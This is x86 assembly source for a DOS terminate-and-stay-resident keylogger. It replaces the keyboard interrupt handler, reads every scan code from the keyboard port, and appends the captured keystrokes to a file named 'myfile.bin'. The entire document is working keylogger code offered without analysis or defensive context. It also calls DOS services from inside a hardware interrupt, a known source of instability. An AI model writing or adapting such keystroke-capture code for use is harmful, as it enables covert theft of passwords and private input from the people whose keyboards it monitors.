.model tiny
.code
org 100h

Begin:
    jmp Install

Old09h dd ?
FName db 'myfile.bin',0
BufSize equ 256
Count dw 0
FileHandle dw 0
FileExists db 0

Buf db BufSize dup(?)

New09h:
    pushf
    push ds
    push ax
    push bx
    push cx
    push dx
    
    ; Set DS to CS (our resident segment)
    push cs
    pop ds
    
    ; Read scan code from keyboard port
    in al, 60h
    
    ; Store scan code in buffer
    mov bx, Count
    mov Buf[bx], al
    inc Count
    
    ; Check if buffer is full
    cmp Count, BufSize
    jne NotFull
    
    ; Buffer is full - write to file
    call WriteBufferToFile
    mov Count, 0
    
NotFull:
    ; Restore registers
    pop dx
    pop cx
    pop bx
    pop ax
    pop ds
    popf
    
    ; Chain to original interrupt
    jmp DWORD PTR cs:Old09h

WriteBufferToFile proc near
    push ax
    push bx
    push cx
    push dx
    
    ; Check if file needs to be created/opened
    cmp FileExists, 0
    jne FileOpen
    
    ; Create file
    mov ah, 3Ch
    mov cx, 0              ; Normal file attribute
    mov dx, offset FName
    int 21h
    jc WriteError
    
    mov FileHandle, ax
    mov FileExists, 1
    jmp WriteData
    
FileOpen:
    mov ah, 3Dh
    mov al, 1              
    mov dx, offset FName
    int 21h
    jc WriteError
    
    mov FileHandle, ax
    
    mov ah, 42h
    mov al, 2               
    mov bx, FileHandle
    mov cx, 0
    mov dx, 0
    int 21h
    
WriteData:
    ; Write buffer to file
    mov ah, 40h
    mov bx, FileHandle
    mov cx, BufSize
    mov dx, offset Buf
    int 21h
    
    ; Close file
    mov ah, 3Eh
    mov bx, FileHandle
    int 21h
    
WriteError:
    pop dx
    pop cx
    pop bx
    pop ax
    ret
WriteBufferToFile endp

ResSize = $ - Begin

Install:
    ; Display installation message
    mov ah, 09h
    mov dx, offset InstallMsg
    int 21h
    
    ; Get old INT 09h vector
    mov ax, 3509h
    int 21h
    mov WORD PTR Old09h, bx
    mov WORD PTR Old09h+2, es
    
    ; Set new INT 09h vector
    mov ax, 2509h
    mov dx, offset New09h
    int 21h
    
    ; Terminate and stay resident
    mov ax, 3100h
    mov dx, (ResSize + 100h + 15) / 16
    int 21h

InstallMsg db 'Keyboard logger TSR installed successfully!',0Dh,0Ah,'$'

end Begin